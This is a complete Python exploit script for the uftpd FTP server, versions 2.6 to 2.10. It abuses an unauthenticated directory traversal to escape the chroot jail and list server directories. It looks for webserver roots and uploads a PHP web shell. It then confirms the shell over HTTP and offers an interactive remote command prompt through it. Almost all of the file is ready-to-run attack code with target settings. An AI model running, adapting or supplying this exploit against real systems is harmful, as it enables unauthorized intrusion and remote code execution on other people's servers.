#!/usr/bin/env python3


# Author: Aaron Esau (Arinerron) <security@aaronesau.com>
# Writeup: https://aaronesau.com/blog/posts/6
# Product: uftpd 2.6-2.10

# This exploit uses a directory traversal vulnerability and escapes uftpd's
# crappy implementation of a chroot jail. It does not require authentication.
# It  looks for common webserver paths on the FTP server and attempts to place a
# PHP backdoor to pop a shell with. It also tries to make a crontab to get code
# execution, and it tries overwriting some rc files too.


#################
# Configuration #
#################


# the IPv4 address of the remote host
RHOST = '127.0.0.1'

# an IPv4 address accessible from the remote host
LHOST = '127.0.0.1'

# the port that the FTP server is using on the remote host
RPORT = 21

# the filename (basename) of the file to upload
FILENAME = 'shell.php'

# the contents of the uploaded file
FILE_CONTENT = '<?php system($_REQUEST["cmd"]); ?>\n'

# make a GET request to see if the file is accessible afterward?
CHECK_FILE = True

# a list of webserver paths to check on the remote host, in order of priority
WEBSERVER_PATHS = [
    '/var/www/html/',
    '/srv/http/',
    '/web/',
    '/www',
    '/srv/www-data/',
    '/srv/www/',
    '/var/www/',
    '/srv/'
]

# whether or not to upload the file in each directory or only the first found
STOP_ON_FIRST = True

# if True, it will not check if a directory exists, just try to upload immediately
# Note: If enabled, it will ignore STOP_ON_FIRST
AGGRESSIVE_MODE = False

# if True, it will only upload if it detects "webserver-like" files in the directory
# Note: If enabled, it will ignore AGGRESSIVE_MODE
STRICT_WEBSERVER = True

# these are the extensions to use to identify "webserver-like" directories
WEBSERVER_EXTENSIONS = [
    '.php',
    '.aspx',
    '.asp',
    '.cgi',
    '.html',
    '.htm',
    '.js',
    '.css',
    '.scss'
]

# this makes logging get messy, useful if the script is broken
DEBUG = False


####################
# Useful Libraries #
####################


# cheers, no external libraries!

import sys, socket, urllib.request, urllib.parse, re, time

# try to configure things if the person was too lazy to open this PoC

if len(sys.argv) >= 2:
    RHOST = sys.argv[1]

    if len(sys.argv) >= 3:
        RPORT = sys.argv[2]

    # they were probably too lazy to configure this too :(
    LHOST = socket.gethostbyname(socket.gethostname())

# nice logging things

def log(msg, char = '*', color = '\033[94m'):
    print('\033[01m\033[96m[\033[0m%s%s\033[0m\033[01m\033[96m]\033[0m %s%s\033[0m'
        % (color, char, color, msg))

vlog = lambda msg : log(msg, char = ' ', color = '\033[0m')
dlog = lambda msg : log(msg)
ilog = lambda msg : log(msg, char = '+', color = '\033[92m')
wlog = lambda msg : log(msg, char = '!', color = '\033[33m')
elog = lambda msg : log(msg, char = '-', color = '\033[01m\033[31m')

# useful socket functions

class tcp:
    class client:
        def __init__(self, ip, port, sock = None):
            if not sock:
                # connect to the server
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))

            self.sock, self.ip, self.port = sock, ip, port

        # read until a \n
        def read(self, decode = True, strip = True, timeout = 2):
            self.sock.settimeout(timeout)
            res = self.sock.recv(1024).replace(b'\r', b'') # grrr...

            if strip:
                res = res.strip()

            if decode:
                return res.decode('utf-8', errors = 'ignore')

            return res

        # reads until a \n\n
        def read_forever(self, decode = True, strip = True):
            data = list()

            while True:
                res = self.read(decode = False, strip = False)

                if len(res) == 0:
                    break

                data.append(res)

            res = b''.join(data)

            if decode:
                res = res.decode('utf-8', errors = 'ignore')

            if strip:
                return res.strip()

            return res

        def write(self, data):
            if isinstance(data, str):
                data = data.encode()

            return self.sock.send(data)

        def close(self):
            return self.sock.close()

    class server(client):
        def __init__(self, port):
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.bind((LHOST, port))
            self.sock.listen(0)

            self.port = port

        def get_port(self):
            return self.sock.getsockname()[1]

        def accept(self):
            return tcp.client(None, None, sock = self.sock.accept()[0])

# useful ftp things

# creates the format octet,octet,octet,octet,portnumb,portnumb for FTP PORT cmd
def PORT(sock, host, port):
    formatted_port = ','.join(host.split('.') + [str(port // 256), str(port % 256)])

    res = send_cmd(sock, ['PORT', formatted_port])

    return '200 PORT command successful' in res

# removes duplicate slashes from filepaths
def strip_slashes(data):
    while '//' in data:
        data = data.replace('//', '/')

    return data

# send an FTP command, made for lazy devs
def send_cmd(sock, cmd):
    # convert to list lol
    if isinstance(cmd, str):
        cmd = [cmd]

    cmd = ' '.join(cmd)

    # write to the socket and debug if necessary
    if DEBUG:
        vlog('---> ' + cmd)

    sock.write(cmd)

    # I don't know why, but it doesn't work without this :P
    time.sleep(0.5) # minimum: 0.1

    try:
        res = sock.read()

        # print all of the input if debug mode is enabled
        if DEBUG:
            for line in res.split('\n'):
                vlog('<--- ' + line)
    except socket.timeout:
        return ''

    return res.strip()

def setup_cmd_session(sock, cmd):
    server = tcp.server(0) # let kernel pick a port
    port = server.get_port()

    vlog('Opened TCP server on %s:%d' % (LHOST, port))

    PORT(sock, LHOST, port)

    res = send_cmd(sock, cmd)

    if not '150 Data connection opened; transfer starting' in res:
        vlog('The server did not send the response to the socket')

        return False

    client = server.accept()
    return server, client

# send a command and get data response
def send_cmd_read_data(sock, cmd):
    output = setup_cmd_session(sock, cmd)

    # this is in case it fails to setup transfer session
    if not output:
        return False

    server, client = output

    client.sock.settimeout(3)
    return client.read_forever()

# send a command and get data response
def send_cmd_write_data(sock, cmd, data):
    output = setup_cmd_session(sock, cmd)

    # this is in case it fails to setup transfer session
    if not output:
        return False

    server, client = output

    client.sock.settimeout(3)
    client.write(data)
    client.close()

    return True

# returns a list of tuples (name, perms)
def LIST(sock, directory, prefix = '../' * 16):
    res = send_cmd_read_data(sock, ['LIST', strip_slashes(prefix + directory)])

    files = list()

    # :(
    if not res or len(res.strip()) == 0:
        return files

    # read in the file format and prettyify it
    for line in res.split('\n'):
        file_details = line.split(' ')
        files.append((file_details[-1], file_details[0])) # (name, perms)

    return files

# uploads a file with contents `contents` to a file named `filename`
def STOR(sock, filename, contents, prefix = '../' * 16):
    return send_cmd_write_data(sock, ['STOR', strip_slashes(prefix + filename)], contents)


################
# Exploit Code #
################


if __name__ == '__main__':
    # make a nice pretty banner thing
    print()
    ilog('''\033[01m\033[32muftpd Directory Traversal (Chroot Bypass)
    \033[0m\033[32mAuthor: Aaron Esau (Arinerron)
    Writeup: \033[04mhttps://aaronesau.com/blog/posts/6
''')

    # try to connect to the server
    ilog('Connecting to %s:%d...' % (RHOST, RPORT))
    sock = tcp.client(RHOST, RPORT)

    # banner check the server
    banner = sock.read()
    dlog('Banner: ' + banner)

    if not 'uftpd' in banner:
        elog('A uftpd server does not appear to be running at %s:%d' %(RHOST, RPORT))

    banner_match = re.search('.*uftpd \((2\.(10|[6-9])).*\).*', banner)

    if not banner_match:
        wlog('The target uftpd server does not appear to be running the right version')
    else:
        ilog('The target appears to be running uftp version %s which is vulnerable' % banner_match.group(1))

    # we'll add all the paths here we want to upload to
    targets = set()

    found = False

    # try each path
    for path in WEBSERVER_PATHS:
        # "aggressive mode" tells it to not check if the directory exists first
        if not (AGGRESSIVE_MODE and not STRICT_WEBSERVER):
            files = LIST(sock, path)

            if len(files) != 0:
                found = True

                dlog('Found a directory with %d files' % len(files))

                # look for webserver-like file extensions
                found_extensions = set()

                for filename, perms in files:
                    for extension in WEBSERVER_EXTENSIONS:
                        if filename.endswith(extension):
                            found_extensions.add(extension)

                # if we found "webserver-like" extensions
                if len(found_extensions) != 0:
                    extensions_list = ', '.join(found_extensions)

                    # we gotta keep good english here tho
                    if len(found_extensions) == 2:
                        extensions_list = ' and '.join(found_extensions)
                    elif len(found_extensions) > 2:
                        extensions_list = ', '.join(list(found_extensions)[:-1]) + ', and ' + list(found_extensions)[-1]

                    dlog('Found files with the extension' + ('s' if len(found_extensions) > 1 else '') + ' %s, so this path is probably a webserver' % extensions_list)

                # ok well we found what we wanted, let's keep it
                if not (STRICT_WEBSERVER and len(found_extensions) == 0):
                    targets.add(path)

                    # warn about overwriting files
                    for filename, perms in files:
                        if FILENAME == filename:
                            wlog('Will overwrite existing file %s' % strip_slashes(path + FILENAME))
                            break
        else:
            # aggressive mode, we want it!
            targets.add(path)

        # stop if told to
        if (found and STOP_ON_FIRST):
            vlog('STOP_ON_FIRST is enabled and a path was found, stopping...')
            break
    
    # tell the user if we didn't find anything
    if len(targets) == 0:
        wlog('Either the vulnerability is unexploitable or we were unable to find a writable path')
    else:
        # now upload to each path we found
        for path in targets:
            basename = FILENAME
            filename = strip_slashes(path + '/' + basename)

            dlog('Uploading %s to %s ...' % (basename, filename))

            if not STOR(sock, filename, FILE_CONTENT):
                wlog('Failed to upload file to %s' % filename)
            else:
                ilog('File uploaded to %s' % filename)

        # check the webserver to see if the file is accessible
        if CHECK_FILE:
            url = 'http://%s/%s' % (RHOST, FILENAME)

            found = False

            try:
                urllib.request.urlopen(url, timeout = 5).read().decode('utf-8', errors = 'ignore')

                found = True
                ilog('Hooray, your file was found at %s ...have fun!' % url)
            except:
                wlog('The file %s could not be found on the webserver, you will have to manually look for it' % FILENAME)

            # if the user is super lazy and didn't even bother to configure, let's just pop a nice shell
            if found and (FILENAME == 'shell.php' and FILE_CONTENT.strip() == '<?php system($_REQUEST["cmd"]); ?>'):
                try:
                    while True:
                        cmd = urllib.parse.urlencode({'cmd' : input('$ ')})
                        print(urllib.request.urlopen(url + '?' + cmd, timeout = 5).read().decode('utf-8', errors = 'ignore')[:-1])
                except (KeyboardInterrupt, EOFError) as e:
                    pass

    dlog('Script finished, goodbye!')
    exit()
